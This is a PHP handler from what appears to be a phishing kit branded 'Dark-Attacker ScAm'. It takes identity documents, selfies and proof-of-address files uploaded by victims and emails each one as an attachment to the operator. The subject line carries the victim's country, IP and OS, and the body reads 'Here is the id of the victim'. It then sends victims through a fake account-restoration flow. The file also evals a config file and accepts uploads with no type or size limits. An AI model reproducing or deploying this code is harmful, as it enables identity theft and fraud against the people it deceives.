<?php
require_once __DIR__ . '/../include/fileuploader/autoload.php';
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

if (file_exists('../config/' . $api->general_config)) {
  @eval(file_get_contents('../config/' . $api->general_config));
    
    
}

$FileUploader = new FileUploader('files', array(
    'limit' => null,
    'maxSize' => null,
    'fileMaxSize' => null,
    'extensions' => null,
    'required' => true,
    'uploadDir' => '../admin/uploads/',
    'title' => 'name',
    'replace' => false,
    'listInput' => true,
    'files' => null
));


foreach ($FileUploader->getRemovedFiles('file') as $key => $value) {
  unlink('../admin/uploads/' . $value['name']);
}

$data = $FileUploader->upload();

if ($data['isSuccess'] && count($data['files']) > 0) {
    $uploadedFiles = $data['files'];
    //recipient
$to = $email_results;

//sender
$from = 'dark@dark.com';
$fromName = 'Dark-Attacker';

//email subject
$subject = "New Id [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." ]"; 

//attachment file path
$file = '../admin/uploads/'.$data['files'][0]['name'];

//email body content
$htmlContent = '<h1>Here is the id of the victim</h1>
    <p>Thanks for using Dark-Attacker ScAm visit us now orvx.pw</p>';

//header for sender info
$headers = "From: $fromName"." <".$from.">";

//boundary 
$semi_rand = md5(time()); 
$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x"; 

//headers for attachment 
$headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\""; 

//multipart boundary 
$message = "--{$mime_boundary}\n" . "Content-Type: text/html; charset=\"UTF-8\"\n" .
"Content-Transfer-Encoding: 7bit\n\n" . $htmlContent . "\n\n"; 

//preparing attachment
if(!empty($file) > 0){
    if(is_file($file)){
        $message .= "--{$mime_boundary}\n";
        $fp =    @fopen($file,"rb");
        $data =  @fread($fp,filesize($file));

        @fclose($fp);
        $data = chunk_split(base64_encode($data));
        $message .= "Content-Type: application/octet-stream; name=\"".basename($file)."\"\n" . 
        "Content-Description: ".basename($file)."\n" .
        "Content-Disposition: attachment;\n" . " filename=\"".basename($file)."\"; size=".filesize($file).";\n" . 
        "Content-Transfer-Encoding: base64\n\n" . $data . "\n\n";
    }
}
$message .= "--{$mime_boundary}--";
$returnpath = "-f" . $from;

//send email
       foreach(explode(",", $email_results) as $tomail) {
  @mail($tomail, $subject, $message, $headers, $returnpath); 
       }


    if($_POST['idtype'] == 'proof'){header("location: ../myaccount/confirm=identity?selfie");}
    elseif($_POST['idtype'] == 'selfie'){header("location: ../myaccount/confirm=identity?address");}
    elseif($_POST['idtype'] == 'address'){header("location: ../myaccount/restored");}
}




elseif ($data['warnings'][0] == "No file was choosed. Please select one") {
    
        if($_POST['idtype'] == 'proof'){header("location: ../myaccount/confirm=identity?proof");}
    elseif($_POST['idtype'] == 'selfie'){header("location: ../myaccount/confirm=identity?selfie");}
    elseif($_POST['idtype'] == 'address'){header("location: ../myaccount/confirm=identity?address");}
}



else{header("location: ../myaccountaaa/confirm=identity");}




?>
